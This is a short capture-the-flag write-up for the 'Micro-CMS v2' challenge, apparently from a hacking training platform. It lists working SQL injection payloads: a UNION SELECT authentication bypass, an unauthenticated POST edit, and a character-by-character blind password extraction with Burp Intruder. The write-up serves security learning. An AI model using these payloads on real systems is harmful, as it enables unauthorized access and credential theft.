# Micro-CMS v2
### Flag 0
* Using '<:;>" as username and password produces the following error
```
 Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ';'' at line 1")
```
* Use *' UNION SELECT '111' as password* as the username and *111* as password
* Open the private page to get the flag

### Flag 1
* Editing post requires user to login. So try to edit post without logging in.
* Send a POST request to edit the post using curl or Burp repeater.
* The response contains the flag

### Flag 2
* Use *' OR password like %x#* as username and attack using Burp Intruder. Change x from a-z and filter out all responses that contain *Unknown User* in the response. This would leave only 1 response which contains *Invalid Password* in the reponse. This is the last character of the password.
* Replace x by the last character of the password. Now use *' OR password like %yx#* where y varies from a-z. This way get the 2nd last character of password. Continue this process to build the password character by character.
* On getting the password use *' OR password = 'password'#* as username and *password* as password and login to get the flag.